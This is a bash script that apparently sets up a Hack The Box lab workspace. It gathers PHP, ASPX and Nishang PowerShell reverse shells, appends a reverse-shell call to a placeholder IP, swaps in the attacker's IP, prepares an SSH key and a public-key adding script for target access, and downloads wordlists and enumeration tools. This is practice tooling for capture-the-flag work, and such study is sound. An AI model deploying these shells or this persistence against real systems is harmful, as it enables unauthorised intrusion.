#!/bin/bash

#ip="10.10.14.9"

#pull newest black-badge
cd ~/my_data/g/black-badge
git pull >/dev/null

#setup dir
cd ~
mkdir htb 2>/dev/null
cd htb

#copy reverse shells
cd ~/htb
mkdir reverse-shell 2>/dev/null
cd reverse-shell
cp ~/my_data/g/black-badge/Doc/CC/Reverse-Shell-scripts/php-reverse-shell.php ./prss.php
cp ~/my_data/g/black-badge/Doc/CC/Reverse-Shell-scripts/aspx-shell.aspx ./shell.aspx
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 -O Invoke-PowerShellTcp.ps1
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcpOneLine.ps1 -O powershelltcp.ps1
echo "Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 443" >> Invoke-PowerShellTcp.ps1

#add start python web server script:
echo "sudo python3 -m http.server 666" > start-pythonwebserver.sh
chmod +x start-pythonwebserver.sh

#generate keypair for target logon
cd ~/htb
mkdir rsa 2>/dev/null
cd rsa
ssh-keygen -t rsa -b 4096 -C "htb@woodenshoe" -f ./htb_rsa -q -N "" <<<y 2>&1 >/dev/null




################################################################
#script dir
cd ~/htb
mkdir script 2>/dev/null
cd script

#copy add public key script
cp ~/my_data/g/black-badge/K/Battle/Red/add-pubkey.sh ./add-pubkey.sh
chmod +x ./add-pubkey.sh

#copy create venom script:
cp ~/my_data/g/black-badge/K/Battle/Red/create-venom.sh ./create-venom.sh
chmod +x ./create-venom.sh

#add download nishang script
echo "git clone https://github.com/samratashok/nishang.git 2>/dev/null" > download-nishang.sh
chmod +x download-nishang.sh




################################################################


#change ip addresses in scripts
sed -i "s/10.10.10.10/$1/g" ~/htb/script/*

#change ip addresses in reverse shell
sed -i "s/10.10.10.10/$1/g" ~/htb/reverse-shell/*
sed -i "s/192.168.254.1/$1/g" ~/htb/reverse-shell/*


################################################################
# add wordlists
################################################################
cd ~/htb
mkdir wordlist 2>/dev/null
cd wordlist

#add download seclist script
echo "git clone https://github.com/danielmiessler/SecLists.git 2>/dev/null" > download-seclist.sh
chmod +x download-seclist.sh


#add unpack rockyou script
echo "tar -zxvf ~/htb/wordlist/SecLists/Passwords/Leaked-Databases/rockyou.txt.tar.gz 2>/dev/null" > unpack-rockyou.sh
chmod +x unpack-rockyou.sh


################################################################
# add Enum
################################################################
cd ~/htb
mkdir enum 2>/dev/null
cd enum

#get LinEnum script
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O LinEnum.sh
chmod +x LinEnum.sh

#get Linux suggester:
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
chmod +x les.sh

#add start python web server script:
echo "sudo python3 -m http.server 8888" > start-pythonwebserver.sh
chmod +x start-pythonwebserver.sh

################################################################
# Install Software
################################################################



#install golang
#sudo apt install golang


#install newest version of ffuf with golang
go get github.com/ffuf/ffuf

#end ########
echo "cd ~/htb"
